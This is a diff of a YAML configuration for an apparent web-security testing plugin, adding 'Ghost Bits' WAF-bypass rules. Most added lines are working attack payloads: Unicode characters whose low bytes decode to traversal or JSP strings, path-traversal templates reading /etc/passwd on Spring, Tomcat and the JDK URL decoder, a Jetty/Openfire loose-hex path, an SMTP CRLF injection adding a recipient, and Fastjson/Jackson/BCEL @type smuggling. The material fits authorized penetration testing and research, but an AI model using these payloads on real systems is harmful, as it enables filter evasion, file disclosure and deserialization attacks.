@@ -4,9 +4,10 @@
 general:
   threads: 5                    # 默认线程数
   similarity_threshold: 0.85    # 相似度阈值（低于此值才入表）
+  lang: zh                      # 界面语言: zh | en (修改后重启插件生效)
 
 profiles:
-  access_control:
+  auto_access_bypass:
     # Auto Scan 忽略的静态资源后缀（不区分大小写）
     ignore_extensions:
       # --- 静态资源后缀（避免 Auto Scan 造成噪声/额外请求） ---
@@ -122,9 +123,9 @@ profiles:
       - "%00"
       - "%2e"
 
-  # 预留：手动 WAF 模式规则集（未配置时会回退到 access_control）
-  waf:
-    # 默认复用 access_control（很多访问控制绕过变体同样适用于“被拦截/被拦截页”场景的验证）
+  # Auto-WAF 绕过规则集
+  auto_waf_bypass:
+    # 默认复用 auto_access_bypass（很多访问控制绕过变体同样适用于“被拦截/被拦截页”场景的验证）
     suffix:
       # --- Group A: 静态资源伪装（常见，用于绕过 Auth Filter / 规则误判） ---
       - ".js"
@@ -227,3 +228,185 @@ profiles:
         form_urlencoded: true
         multipart: true
         text_plain: true
+
+      # Ghost Bits 自动绕过（默认生成绕过候选，不做漏洞确认）
+      # - eq: 只对 query/form/json/filename 中已有可疑 token 做低 8 位等价变形
+      # - parser: 只对已有 %xx / unicode escape / x escape 等解析结构做差异变形
+      # - 普通 path 不做通用 Ghost 化，路径类漏洞链交给显式模板
+      # - templates: 完整漏洞链/场景探测，默认关闭；开启后可能替换 path 或 filename
+      ghost_bits:
+        enabled: true
+        raw_socket: true
+        max_variants: 10
+
+        templates:
+          spring_static_lfi: false
+          jetty_loose_hex: false
+          tomcat_jsp_upload: false
+          fullwidth_traversal: false
+          fastjson_x_escape: false
+          angus_smtp_crlf: false
+          fastjson_unicode_digit: false
+          jackson_char_to_hex: false
+          bcel_ghost_bits: false
+          jdk_urldecoder_unicode_digit: false
+          tomcat_url_hex_ghost: false
+
+        generic:
+          enabled: true
+          strategies:
+            minimal: true
+            full: false
+            letters: false
+            digits: false
+            symbols: false
+          variant_count: 1
+
+  # ==========================================================
+  # Ghost Bits 配置（Manual-WAF 工作台使用）
+  # ==========================================================
+  # 说明：
+  # - 收集字符显示形态与后端最终解析语义不一致的绕过原子与模板
+  # - 典型来源包括 char->byte 低 8 位截断、宽松 hex 解析、全角/Unicode 归一化、多阶段 decode
+  # - 三层结构：atoms（单字节查表）/ sequences（命名序列）/ templates（漏洞组合）
+  # - 详见 Black Hat ASIA 2026 浅蓝师傅和1ue师傅的议题
+  # ==========================================================
+  manual_waf_bypass:
+    ghost_bits:
+      # 第 1 层：低字节 -> 候选 Unicode 字符数组
+      # 空数组 [] 表示让引擎在 0x00..0xFF 范围枚举所有 (highByte << 8 | targetByte)
+      atoms:
+        ".":  ["阮"]          # 0x2E
+        "%":  ["严"]          # 0x25
+        "u":  ["灵"]          # 0x75
+        "0":  ["丰"]          # 0x30
+        "2":  ["甲"]          # 0x32
+        "e":  ["来"]          # 0x65
+        "j":  ["陪"]          # 0x6A
+        "\r": ["瘍"]          # 0x0D
+        "\n": ["瘊"]          # 0x0A
+        "@":  []              # 0x40 引擎自动枚举
+        "/":  []              # 0x2F 引擎自动枚举
+        ":":  []              # 0x3A
+        ";":  []              # 0x3B
+        "'":  []              # 0x27
+        "\"": []              # 0x22
+        "<":  []              # 0x3C
+        ">":  []              # 0x3E
+
+        # 补充数字候选（Jackson charToHex / BCEL decode 的 (byte)ch 截断）
+        "1":  ["失"]          # U+5931 → 0x31
+        "3":  ["耳"]          # U+8033 → 0x33
+        "4":  []              # 0x34
+        "5":  []              # 0x35
+        "6":  ["茶"]          # U+8336 → 0x36
+        "7":  ["男"]          # U+7537 → 0x37
+        "8":  []              # 0x38
+        "9":  ["夹"]          # U+5939 → 0x39
+        "$":  []              # 0x24（BCEL $$BCEL$$ 前缀）
+
+      # 第 2 层：命名好的字符序列（一些典型 payload）
+      sequences:
+        dot_u002e: "阮严灵丰丰甲来"   # 低位还原后 -> .%u002e
+        crlf:      "瘍瘊"            # 低位还原后 -> \r\n
+        jsp_ext:   "陪sp"           # 低位还原后 -> jsp
+
+        # fastjson Character.digit() Unicode 数字序列（非截断机制，是 digit() API 兼容）
+        # Arabic-Indic: ٠١٢٣٤٥٦٧٨٩  Thai: ๐๑๒๓๔๕๖๗๘๙
+        # 用于 \u 转义中替代 hex 数字，WAF 看不懂但 fastjson 正常解析
+        fastjson_at: "\\u٠٠٤٠"      # Character.digit('٠',16)=0, digit('٤',16)=4 → \u0040 → @
+
+      # 第 3 层：漏洞模板，按中间件 / CVE 分组
+      # target: path / filename / header_value / selection
+      # sender: raw（强制 Raw Socket）/ any（任意）
+      templates:
+        spring_static_lfi:
+          category: "Spring"
+          cve: "CVE-2025-41242"
+          label: "Spring Static Path Traversal (LFI)"
+          target: "path"
+          pattern: "/{{seq:dot_u002e}}/{{seq:dot_u002e}}/{{seq:dot_u002e}}/etc/passw{{url:d}}"
+          sender: "raw"
+          notes: "Spring 检查阶段看不到 ../，后续解析阶段低位还原为 .%u002e 并继续解码为 .."
+
+        jetty_loose_hex:
+          category: "Jetty"
+          cve: "CVE-2023-32315"
+          label: "Jetty %2> Loose Hex (Openfire 进阶)"
+          target: "path"
+          pattern: "/setup/setup-s/%2>%2>/%2>%2>/log.jsp"
+          sender: "any"
+          notes: "TypeUtil.convertHexDigit 容错: %2> -> %2E -> ."
+
+        tomcat_jsp_upload:
+          category: "Tomcat"
+          label: "JSP Upload Filename (Bare Ghost)"
+          target: "filename"
+          pattern: "1.{{seq:jsp_ext}}"
+          sender: "raw"
+          notes: "RFC2231 multipart filename* 解析差异: 陪 -> j"
+
+        tomcat_url_hex_ghost:
+          category: "Tomcat"
+          label: "Tomcat %HH Ghost Filename"
+          target: "filename"
+          pattern: "1.%鸶繡sp"
+          sender: "any"
+          notes: "RFC2231 multipart filename* 解析差异，%HH 中的 H 使用 7-bit Ghost 字符，鸶繡 低 7 位还原为 6a"
+
+        angus_smtp_crlf:
+          category: "SMTP"
+          cve: "CVE-2025-7962"
+          label: "Angus Mail CRLF Injection"
+          target: "selection"
+          pattern: "<a@b.com>{{seq:crlf}}RCPT TO:<x@evil>{{seq:crlf}}"
+          sender: "any"
+          notes: "(byte) chars[i] 把 char 直接写为 byte"
+
+        fastjson_x_escape:
+          category: "Fastjson"
+          label: "Fastjson \\x Loose Escape"
+          target: "selection"
+          pattern: "\\x4_type"
+          sender: "any"
+          notes: "\\x 解析表未填充位置按 0 参与计算: \\x4_ -> 0x40 -> @"
+
+        fullwidth_traversal:
+          category: "Generic"
+          label: "Fullwidth URL Encoding Traversal"
+          target: "path"
+          pattern: "/%２ｅ%２ｅ%２ｆ%２ｅ%２ｅ%２ｆetc%２ｆpasswd"
+          sender: "any"
+          notes: "全角 %２ｅ 在多重规范化后还原为 %2e -> ."
+
+        fastjson_unicode_digit:
+          category: "Fastjson"
+          label: "Fastjson \\u Character.digit() Bypass"
+          target: "selection"
+          pattern: "{{seq:fastjson_at}}type"
+          sender: "any"
+          notes: "\\u 转义 hex 解析使用 Character.digit(): Arabic-Indic ٠٠٤٠ → 0040 → @。⚠️ 警告：此漏洞基于真实的数字属性，请勿对其使用“换组”操作！"
+
+        jackson_char_to_hex:
+          category: "Jackson"
+          label: "Jackson \\u charToHex Ghost Escape"
+          target: "selection"
+          pattern: "\\u{{atom:0}}{{atom:0}}{{atom:4}}{{atom:0}}type"
+          sender: "any"
+          notes: "Jackson ReaderBasedJsonParser 的 charToHex(ch & 255): Ghost 化 \\u0040 的 4 个 hex 位，低位还原后仍为 @type；SpringBoot 默认 UTF8StreamJsonParser 通常不触发"
+
+        bcel_ghost_bits:
+          category: "BCEL"
+          label: "BCEL Utility#decode Ghost Bits"
+          target: "selection"
+          pattern: "$$BCEL$$"
+          sender: "any"
+          notes: "$$BCEL$$ 前缀必须保持字面量；真正 Ghost 化的是后续 gzip/class encoded bytes，本模板只插入前缀"
+
+        jdk_urldecoder_unicode_digit:
+          category: "JDK"
+          label: "JDK URLDecoder Unicode Digit Bypass"
+          target: "path"
+          pattern: "/%٢e%٢e/%٢e%٢e/%٢e%٢e/etc/passwd"
+          sender: "any"
+          notes: "Integer.parseInt() 接受 Unicode 数字变体（如 Arabic-Indic ٢）：%٢e%٢e -> %2e%2e -> .. ⚠️ 警告：此漏洞基于真实的数字属性，请勿对其使用“换组”操作！"
